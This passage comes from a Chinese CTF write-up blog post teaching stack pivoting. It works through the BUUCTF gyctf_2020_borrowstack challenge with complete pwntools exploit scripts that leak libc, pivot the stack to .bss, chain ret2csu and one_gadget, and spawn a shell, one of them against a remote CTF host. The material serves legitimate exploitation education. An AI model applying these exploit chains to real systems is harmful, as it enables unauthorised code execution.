class="line">read_plt=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x08048513</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;aaaa&#x27;</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(<span class="number">0x0804A300</span>)+p32(<span class="number">0x08048511</span>) <span class="comment">#前面的是bss段地址，后面这个地址是level;ret地址</span></span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">obj=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-obj.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=libc_base+obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_addr=libc_base+obj.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload4=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(<span class="number">0x0804A300</span>)+p32(<span class="number">0x08048511</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload4)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这里有一个很重要的点，一定要注意，就是这里第二次输入的时候，必须要用send去发送，不能用sendline发送</p>
+<p>下图的左侧是使用send发送了0x20个数据，右侧使用的是sendline发送了0x20个数据，可以发现，<em>右侧最后发送是多了一个回车</em>，此时程序本来是正常要发送一句hello good ctfer!what is you name?然后会等待用户发送一个内容，然后显示what you want to，左侧的确是这样，但右侧直接what is you name?之后把what you want to给打印出来了，也就根本没有让用户输入内容，为什么？<strong>因为sendline多出来的回车，存放到了缓冲区里面，下次输入的时候，程序直接就把缓冲区里的内容读进去了，发现是个回车，程序认为你的输入已经结束了，因此就打印了what you want to，事实上你根本就还没输入。</strong></p>
+<p>由此可见，在任何时候发送数据，选择sendline时，都需谨慎。<br>
+<img src="../img/2706180-20220118123108958-93341427.jpg" alt="EkPq.jpg" border="0"></p>
+<h2 id="BUUCTF上的gyctf-2020-borrowstack">BUUCTF上的gyctf_2020_borrowstack</h2>
+<p>这道题，不知道什么原因，用远程的exp是打不通本地的。因此这里我远程和本地的wp分别写了一份。二者的前面是一模一样的（但是后面的思路是不一样的），如果看过其中一份，那么另一份前面的内容跳过即可。<br>
+###打远程的WP</p>
+<p><img src="../img/2706180-20220206163044818-1824898636.png" alt=""><br>
+<img src="../img/2706180-20220206163110657-718675687.png" alt=""></p>
+<p>主程序很简单，也发现了溢出点在第一次输入上，read读入buf的时候，可以溢出16个字节，也就是溢出两个内存单元的内容。</p>
+<p><img src="../img/2706180-20220206163137949-2023688181.png" alt=""></p>
+<p>可以发现，我们仅仅能控制rbp和返回地址。并且第二次输入的bank，输入到了bss段</p>
+<p><img src="../img/2706180-20220206163202729-1115577905.png" alt=""></p>
+<p>那我们就可以考虑栈迁移，把需要构造的payload转移到bss段。同时也没有发现后门函数和/bin/sh参数。</p>
+<p>我们先说一下正常的思路。之前讲过了栈迁移的原理，因此我们第一次的read肯定是前面填充垃圾数据，然后把rbp填充成我们要迁移的地址，然后返回地址写一个level;ret指令的地址。然后第二次输入到bss段去构造我们的payload。因为我们没有后门函数，那只能去泄露一个函数地址，然后去动态库里面找后门函数，接着把返回地址填写成main函数的地址，然后再来一次栈迁移，去构造获取shell的payload。</p>
+<p>但是这道题有好几个地方需要去注意。首先是我们看一下写入bss段地址。</p>
+<p><img src="../img/2706180-20220206163247051-126352913.png" alt=""></p>
+<p><img src="../img/2706180-20220206163309124-364277226.png" alt=""></p>
+<p>发现了got表离这个bss段地址是很近的，因为我们要把栈迁移到bss段，就是可以把这个bss段给看成栈了，我们会在这个“栈”里面调用puts函数去泄露函数地址，但是调用puts的时候会开辟新的栈帧从而改变地址较低处的内容（不仅仅是got表，还有FILE *stdout和FILE *stdin），导致程序崩溃。这里光说的话，比较抽象，我在这里详细讲一下。</p>
+<p>因为这里的地址0x601060存放的是stdout指针，然后等到返回main函数之后又会执行setbuf(stdout, 0LL);可是因为这个0x601060距离我们迁移到的bss段这里太近了（我们迁移到的地址是0x601080），当执行put函数的时候执行了一次sub rsp 0x18,并且还执行了多次的push，此时的0x601060已经被覆盖成别的内容了具体情况参考下面的图【1】和图【2】<br>
+<img src="../img/2706180-20220206163334765-1162997865.png" alt=""></p>
+<p><img src="../img/2706180-20220206163343356-1256253278.png" alt=""></p>
+<p>​												               图【1】</p>
+<p><img src="../img/2706180-20220206163355949-1171818220.png" alt=""></p>
+<p>​																	图【2】</p>
+<p>可以看见这两张图片，都因为调用了puts函数，从而影响了栈的变化，修改了stdout指针。等到返回main函数的时候，执行了setbuf(stdout, 0LL)，从而导致程序崩溃。</p>
+<p>因此在这里我们的思路是利用ret指令，把构造的payload的存入稍微高点的地址空间，这样即使执行了puts函数开辟了栈帧，也依旧没有干扰到0x601060所存放的stdout指针。</p>
+<p>继续说这个思路遇见的问题，因为要利用ret指令往下迁移来进行“栈”的布局，但是用多少个ret往下滑，这个只能去一次一次试。发现至少填充20个ret就可以把&quot;栈&quot;迁移到一个不会影响程序运行的地方。也就是说我们只要第二次先输入20个ret，然后正常的写一个pop_rdi的指令，然后是puts的got地址，接着就填写puts的plt地址，最后把返回地址填写成main函数。这样就泄露出来了libc_base，然后找到libc版本（打本地和远程找libc版本是方法是不一样的）我这里说下远程的libc版本怎么找，看网上师傅们说是泄露函数地址的后三位，然后上网站上搜索libc版本，可是我试了下不行（不知道是哪出了问题），然后有位师傅告诉我他是这么找的。</p>
+<p><img src="../img/2706180-20220206163407809-1014058819.png" alt=""></p>
+<p>发现这是ubuntu16，然后去BUUCTF上找资源（因为我这个是在BUUCTF上做的），发现资源如下</p>
+<p><img src="../img/2706180-20220206163434246-1049956071.png" alt=""></p>
+<p>然后点一下这个64bit的这个libc，下载即可。</p>
+<p>最后用one_gadget来搜索这个libc的库，去找到获取shell的语句地址。</p>
+<p><img src="../img/2706180-20220206163445744-69836766.png" alt=""></p>
+<p>这个constraints下面的就是这个execve执行的条件(至于哪个地址能满足这个条件，一个一个试试就行），然后上面就是对应的地址，最后我们要用这个地址去加上libc_base，得到真正的one_gadget地址。接着返回到main函数再来一遍，这回第一次输入的时候，我们直接把这个one_gadget给放入返回地址即可。最后要注意的就是因为返回到main函数之后，是有两个read的，尽管我们在第一个read就覆盖了返回地址，但是还是要把第二个read给发送一个内容，才可以结束main函数，因此我在最后一个read发送了一个’1’。</p>
+<p>这个思路其实还有一种变形，就是在第一次read的时候，把rbp直接填充成我们要迁移之后的地址（这个地址是要保证执行puts函数也不会干扰到程序的正常数据），然后第二次输入只需要把迁移后的地址之前全部填充成垃圾数据，然后构造payload，等到迁移之后，直接迁移到了构造的payload的这里，效果和变形之前的思路是一样的）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25199</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_ret_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span></span><br><span class="line">ret_addr=<span class="number">0x4004c9</span></span><br><span class="line">main_addr=<span class="number">0x400626</span></span><br><span class="line">payload1=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr)+p64(level_ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line">payload2=p64(ret_addr)*<span class="number">20</span> <span class="comment">#这里ret最少是20个，也可以多一点</span></span><br><span class="line">payload2+=p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">shell=libc_base+<span class="number">0x4526a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(shell))</span><br><span class="line">payload3=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xdeadbeef</span>)+p64(shell)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;u want\n&#x27;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>###打本地的wp</p>
+<p><img src="../img/2706180-20220206163044818-1824898636.png" alt=""><br>
+<img src="../img/2706180-20220206163110657-718675687.png" alt=""></p>
+<p>主程序很简单，也发现了溢出点在第一次输入上，read读入buf的时候，可以溢出16个字节，也就是溢出两个内存单元的内容。</p>
+<p><img src="../img/2706180-20220206163137949-2023688181.png" alt=""></p>
+<p>可以发现，我们仅仅能控制rbp和返回地址。并且第二次输入的bank，输入到了bss段</p>
+<p><img src="../img/2706180-20220206163202729-1115577905.png" alt=""></p>
+<p>那我们就可以考虑栈迁移，把需要构造的payload转移到bss段。同时也没有发现后门函数和/bin/sh参数。</p>
+<p>我们先说一下正常的思路。之前讲过了栈迁移的原理，因此我们第一次的read肯定是前面填充垃圾数据，然后把rbp填充成我们要迁移的地址，然后返回地址写一个level;ret指令的地址。然后第二次输入到bss段去构造我们的payload。<strong>因为我们没有后门函数，那只能去泄露一个函数地址，然后去动态库里面找后门函数，接着把返回地址填写成main函数的地址，然后再来一次栈迁移，去构造获取shell的payload。</strong></p>
+<p>但是这道题有好几个地方需要去注意。首先是我们看一下写入bss段地址。</p>
+<p><img src="../img/2706180-20220206163247051-126352913.png" alt=""></p>
+<p><img src="../img/2706180-20220206163309124-364277226.png" alt=""></p>
+<p>发现了got表离这个bss段地址是很近的，因为我们要把栈迁移到bss段，就是可以把这个bss段给看成栈了，我们会在这个“栈”里面调用puts函数去泄露函数地址，但是调用puts的时候会开辟新的栈帧从而改变地址较低处的内容，导致程序崩溃。</p>
+<p>因此在这里我们不去返回到main函数，直接返回到read函数，这样就不会执行setbuf。</p>
+<p>首先的第一个问题就是栈迁移之后，去执行puts函数，puts函数开辟的栈帧会去影响前面的got表中的内容，因此修改rbp时，我们把迁移的地址写的高一点，这样跳转执行的时候，就不会干扰低地址的数据。</p>
+<p>由于这是64位程序，我们要想执行read，需要去找gadget进行传参。可是搜索之后才发现我们没有能控制rdx和rsi的指令，这也就是说我们如果想找gadget的话，执行read函数，连输入的地址都控制不了，因此这里采用ret2csu。</p>
+<p><img src="../img/2706180-20220206164556714-917859079.png" alt=""></p>
+<p>（关于这个ret2csu的细节，在另一篇博客上说明，这里只介绍大致思路），然后执行了read函数之后，直接把read返回地址填写one_gadget地址即可获取shell。在执行read之前先执行puts去泄露puts的got地址，然后把puts的返回地址进行ret2csu去执行read函数。执行完puts的时候要记得给接收了，然后我们要去拿到libc基址，只需要用puts的真实地址去减libc库中的puts地址即可。用ldd去看下程序所依赖的动态库。</p>
+<p><img src="../img/2706180-20220206164604873-25607843.png" alt=""></p>
+<p>获取了动态库的版本之后，就可以得到libc基址，然后再用one_gadget去搜索可以获取shell的one_gadget。</p>
+<p><img src="../img/2706180-20220206164614769-1489437904.png" alt=""></p>
+<p>至于哪个能用，一个一个试一下就行了。最后用one_gadget加上libc基址就是能够获取shell的地址，我们把这个指令的地址放到read的返回地址即可获取shell。至于怎么知道read的返回地址，这里有点讲究。</p>
+<p>因为我们这里直接call read的got地址了，因此执行call的时候，会把下一条指令去当做返回地址，也就是0x4006ed<br>
+<img src="../img/2706180-20220206164714236-513385521.png" alt=""><br>
+（用ida也可以看出来） 又因为返回地址一定会被存到栈里面（这时候在执行read函数之前 用gdb看一下栈 看看哪个地址里面指向的是0x4006ed)</p>
+<p>然后就去将read函数输入内容的地址 设置成那个栈的地址即可</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt_addr=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#why got here </span></span><br><span class="line"><span class="comment">#call函数为跳转到某地址内所保存的地址，应该使用got表中的地址</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span></span><br><span class="line">ret_csu_addr=<span class="number">0x4006FA</span></span><br><span class="line">rsi_addr=<span class="number">0x601118</span></span><br><span class="line">payload1=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr+<span class="number">0x40</span>)+p64(level_addr)<span class="comment">#这里多加0x40的目的就是为了执行puts的时候，不影响之前的got表中的数据</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;u want\n&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(ret_csu_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(read_plt_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload2+=p64(rsi_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0x4006E0</span>)<span class="comment">#why is there an address here</span></span><br><span class="line"><span class="comment">#这一个4006E0仅仅是ret2csu执行了pop之后的ret的返回的地址。</span></span><br><span class="line"><span class="comment">#至于怎么返回到one_gadget上的，是因为read的返回地址被read自己给改了</span></span><br><span class="line"><span class="comment">#payload2中的第一个p64(0)是去占个地方，因为栈迁移本身的特性，迁移后的第一个内存单元不执行</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;k now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f432</span></span><br><span class="line">p.sendline(p64(one_gadget))<span class="comment">#why p64 here #只要是发送地址 就要经过打包之后发送</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1>6、附录</h1>
+<p>找leave;ret指令地址，只要在IDA里的代码段随便找到有leave ret出现的地方，取leave的地址即可</p>
+<p><img src="../img/2706180-20220118122656393-1019618142.png" alt=""></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://zikh26.github.io">ZIKH26</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zikh26.github.io/posts/ee1dcd7f.html">https://zikh26.github.io/posts/ee1dcd7f.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zikh26.github.io" target="_blank">ZIKH26's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a></div><div class="post_share"><div class="social-share" data-image="/img/feiji.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/e734c492.html"><img class="prev-cover" src="/img/huoche.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">关于SROP的学习总结</div></div></a></div><div class="next-post pull-right"><a href="/posts/ccd7886.html"><img class="next-cover" src="/img/12.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">关于vm pwn的学习总结</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/e9a7fcac.html" title="2022强网杯 强网先锋-devnull wp"><img class="cover" src="/img/10.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-14</div><div class="title">2022强网杯 强网先锋-devnull wp</div></div></a></div><div><a href="/posts/1c9fd873.html" title="2023西湖论剑 PWN 部分WP"><img class="cover" src="/img/5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-14</div><div class="title">2023西湖论剑 PWN 部分WP</div></div></a></div><div><a href="/posts/74f96fff.html" title="CATCTF2022_pwn复现"><img class="cover" src="/img/34.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-14</div><div class="title">CATCTF2022_pwn复现</div></div></a></div><div><a href="/posts/da4f7b20.html" title="DASCTF X CBCTF 2022九月挑战赛 pwn部分wp"><img class="cover" src="/img/22.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-14</div><div class="title">DASCTF X CBCTF 2022九月挑战赛 pwn部分wp</div></div></a></div><div><a href="/posts/59b6daad.html" title="DASCTF2022_checkin"><img class="cover" src="/img/33.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-14</div><div class="title">DASCTF2022_checkin</div></div></a></div><div><a href="/posts/2d29ef23.html" title="gyctf_2020_bfnote"><img class="cover" src="/img/lu.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-14</div><div class="title">gyctf_2020_bfnote</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/me.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ZIKH26</div><div class="author-info__description">万古凡间一过客，九天之上第一仙</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">94</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">97</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZIKH26"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ZIKH26" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2777256035@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">1、什么是栈迁移</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">3、学习栈迁移需要自身掌握什么知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">4、栈迁移的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-red-ebp%E5%92%8Cebp%E7%9A%84%E5%86%85%E5%AE%B9%E6%98%AF%E4%B8%A4%E7%A0%81%E4%BA%8B%EF%BC%88%E5%AE%83%E4%BB%AC%E4%BA%8C%E8%80%85%E7%9A%84%E5%85%B3%E7%B3%BB%E5%B0%B1%E5%A6%82%E5%90%8Cc%E8%AF%AD%E8%A8%80%E4%B8%AD-%E6%8C%87%E9%92%88p%E4%B8%8E-p%E7%9A%84%E5%85%B3%E7%B3%BB%EF%BC%89-font"><span class="toc-number">4.0.1.</span> <span class="toc-text">ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E6%A0%B8%E5%BF%83%EF%BC%8C%E5%B0%B1%E5%9C%A8%E4%BA%8E%E4%B8%A4%E6%AC%A1%E7%9A%84leave-ret%E6%8C%87%E4%BB%A4%E4%B8%8A%E9%9D%A2"><span class="toc-number">4.1.</span> <span class="toc-text">栈迁移的核心，就在于两次的leave;ret指令上面</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E8%AF%B4%E6%98%8E%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B9%8B%E5%89%8D%EF%BC%8C%E6%88%91%E5%85%88%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8Bleave%E5%92%8Cret%E5%85%B7%E4%BD%93%E6%98%AF%E5%9C%A8%E5%B9%B2%E4%BB%80%E4%B9%88%EF%BC%8C%E8%BF%99%E9%87%8C%E5%BB%BA%E8%AE%AE%E4%BB%94%E7%BB%86%E7%9C%8B%E4%B8%80%E4%B8%8B%EF%BC%8C%E4%B8%8D%E7%84%B6%E5%90%8E%E9%9D%A2%E8%BF%9E%E7%BB%AD%E4%B8%A4%E4%B8%AAleave-ret%EF%BC%8C%E5%AE%B9%E6%98%93%E6%90%9E%E8%BF%B7%E4%BA%86%EF%BC%89%E3%80%82"><span class="toc-number">4.1.1.</span> <span class="toc-text">(在说明栈迁移原理之前，我先介绍一下leave和ret具体是在干什么，这里建议仔细看一下，不然后面连续两个leave;ret，容易搞迷了）。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">4.2.</span> <span class="toc-text">栈迁移原理：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">5、栈迁移的实战运用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF%E4%B8%8A%E7%9A%84ciscn-2019-es-2"><span class="toc-number">5.1.</span> <span class="toc-text">BUUCTF上的ciscn_2019_es_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E4%B8%8A%E7%9A%84greeting-150"><span class="toc-number">5.2.</span> <span class="toc-text">攻防世界上的greeting-150</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF%E4%B8%8A%E7%9A%84-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98"><span class="toc-number">5.3.</span> <span class="toc-text">BUUCTF上的[Black Watch 入群题]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF%E4%B8%8A%E7%9A%84gyctf-2020-borrowstack"><span class="toc-number">5.4.</span> <span class="toc-text">BUUCTF上的gyctf_2020_borrowstack</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">6、附录</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/81a94eee.html" title="预测urandom的输出"><img src="/img/feiji.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="预测urandom的输出"/></a><div class="content"><a class="title" href="/posts/81a94eee.html" title="预测urandom的输出">预测urandom的输出</a><time datetime="2023-05-14T13:43:19.720Z" title="发表于 2023-05-14 21:43:19">2023-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/5062ac9d.html" title="用汇编语言构造简单的shellcode（64位&amp;&amp;32位）以及将汇编语言转换成机器码的方法"><img src="/img/5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="用汇编语言构造简单的shellcode（64位&amp;&amp;32位）以及将汇编语言转换成机器码的方法"/></a><div class="content"><a class="title" href="/posts/5062ac9d.html" title="用汇编语言构造简单的shellcode（64位&amp;&amp;32位）以及将汇编语言转换成机器码的方法">用汇编语言构造简单的shellcode（64位&amp;&amp;32位）以及将汇编语言转换成机器码的方法</a><time datetime="2023-05-14T13:43:19.720Z" title="发表于 2023-05-14 21:43:19">2023-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d12f5bed.html" title="浅尝拟态防御"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="浅尝拟态防御"/></a><div class="content"><a class="title" href="/posts/d12f5bed.html" title="浅尝拟态防御">浅尝拟态防御</a><time datetime="2023-05-14T13:43:19.716Z" title="发表于 2023-05-14 21:43:19">2023-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ded1a676.html" title="通过创建的线程开启shell绕过沙箱"><img src="/img/17.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="通过创建的线程开启shell绕过沙箱"/></a><div class="content"><a class="title" href="/posts/ded1a676.html" title="通过创建的线程开启shell绕过沙箱">通过创建的线程开启shell绕过沙箱</a><time datetime="2023-05-14T13:43:19.716Z" title="发表于 2023-05-14 21:43:19">2023-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/e0e031bd.html" title="关于条件竞争的一道pwn题"><img src="/img/chengbao.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于条件竞争的一道pwn题"/></a><div class="content"><a class="title" href="/posts/e0e031bd.html" title="关于条件竞争的一道pwn题">关于条件竞争的一道pwn题</a><time datetime="2023-05-14T13:43:19.716Z" title="发表于 2023-05-14 21:43:19">2023-05-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/feiji.png')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By ZIKH26</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi，欢迎来<a href="https://zikh26.github.io/">我的博客</a>!!!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" 